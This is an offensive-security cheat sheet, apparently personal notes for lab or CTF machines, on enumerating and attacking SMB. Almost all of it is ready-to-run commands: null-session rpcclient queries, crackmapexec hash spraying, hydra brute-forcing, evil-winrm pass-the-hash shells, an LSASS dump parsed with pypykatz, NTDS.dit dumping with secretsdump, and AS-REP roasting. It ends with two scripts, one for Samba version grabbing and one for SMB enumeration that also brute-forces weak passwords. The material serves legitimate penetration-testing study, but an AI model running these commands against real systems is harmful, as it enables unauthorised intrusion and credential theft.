## Nmap Scanning

- `nmap 10.10.10.10. --script=smb-enum*`
- `nmap 10.10.10.10 --script=smb-vuln*`
- `nmap 10.10.10.10. --script=smb-os*`
- `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10`


**If have rcpbind**
- `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.23.207IP`
- `rpcclient -U "" <ip>`
- **commands**
  - rpcclient>srvinfo
  - rpcclient>enumdomusers
  - rpcclient>getdompwinfo

**Try first:**
- crackmapexec
	- `cme smb 10.10.10.10 -u {username} -p '{password}' --shares`
		- this will list out the available shares
	- `cme smb 10.10.10.10 -u users -H hashes`
- `smbclient -L \\\\10.10.10.10\\`
- `smbclient \\\\10.10.10.10\\ADMIN$`
- `smbclient \\\\10.10.10.10\\IPC$`
- `smbclient -L \\\\IP\\`
- `smbclient //IP/anonymous`
	- can recursively downlaod all the files here:
	- `smbget -R smb://IP/anonymous`
- `smbclient -L \\\\IP\\anonymous`
- `smbclient -U username \\\\IP\\filename`
- `enum4linux -a -v {ip}`
	- if its a linux box
- with hydra
  - └─# `hydra -l username -P passwordfile.txt smb://IP -t 4 -V`
- metasploit for smb version
- For a shell
	- if have `SeBackupPrivilege` is enabled can use evil-winrm
	- `evil-winrm -i IP -u username -H hash`
- smbmap
	- `smbmap -u {username} -p {password} -d {domain} -H IP`
	- add `-A '(xlsx|docx|txt|xml)' -R` at the end to crawl the users$ share
	- `smbmap -u guest -H IP`
- smbclient & smbclient.py
	- `smbclient -N [\\\\IP\\profiles$](file://IP/profiles$) -c ls | awk '{ print $1 }'`
		- lists everything in the folder
- `GetNPUsers.py domain.local/ -no-pass -userfiles users.txt -dc-ip IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'`
- FFUF `./fuff -w /usr/share/wordlists/dirb/common.txt -u http://IP/FUZZ`
- LSASS Dump
	- `smbclient.py user:'password'@{ip}`
- pypykatz
	- pip3 install pypykatz
	- `pypykatz lsa minidump lsass.DMP`
	- pypykatz to extract and crackmapexec to spray
	- `pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort - u > users` `
- Impacket's secretsdymp.py, wmiexec.py & psexec.py
	- `secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`
 - Searchploit samba verisons

**SMB Commands**
```
- ls
- dir
- cd
- history
- put
- get
- mget
- more
- pwd
- start
- open
- rename
- chmod
- getfacl
- echo
- cancel
- close
- exit
- recurse
- showacls
- vuid
```

# Scripts

## smbver.sh
```
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
sleep 0.5 && echo ""
```

## smbenum.sh
```
#!/bin/bash
# smbenum 0.2 - This script will enumerate SMB using every tool in the arsenal
# SECFORCE - Antonio Quina
# All credits to Bernardo Damele A. G. <bernardo.damele@gmail.com> for the ms08-067_check.py script

IFACE="eth0"

if [ $# -eq 0 ]
    then
        echo "Usage: $0 <IP>"
        echo "eg: $0 10.10.10.10"
        exit
    else
        IP="$1"
fi

echo -e "\n########## Getting Netbios name ##########"
nbtscan -v -h $IP

echo -e "\n########## Checking for NULL sessions ##########"
output=`bash -c "echo 'srvinfo' | rpcclient $IP -U%"`
echo $output

echo -e "\n########## Enumerating domains ##########"
bash -c "echo 'enumdomains' | rpcclient $IP -U%"

echo -e "\n########## Enumerating password and lockout policies ##########"
polenum $IP

echo -e "\n########## Enumerating users ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-users $IP
bash -c "echo 'enumdomusers' | rpcclient $IP -U%"
bash -c "echo 'enumdomusers' | rpcclient $IP -U%" | cut -d[ -f2 | cut -d] -f1 > /tmp/$IP-users.txt

echo -e "\n########## Enumerating Administrators ##########"
net rpc group members "Administrators" -I $IP -U%

echo -e "\n########## Enumerating Domain Admins ##########"
net rpc group members "Domain Admins" -I $IP -U%

echo -e "\n########## Enumerating groups ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-groups $IP

echo -e "\n########## Enumerating shares ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-shares $IP

echo -e "\n########## Bruteforcing all users with 'password', blank and username as password"
hydra -e ns -L /tmp/$IP-users.txt -p password $IP smb -t 1
rm /tmp/$IP-users.txt
```
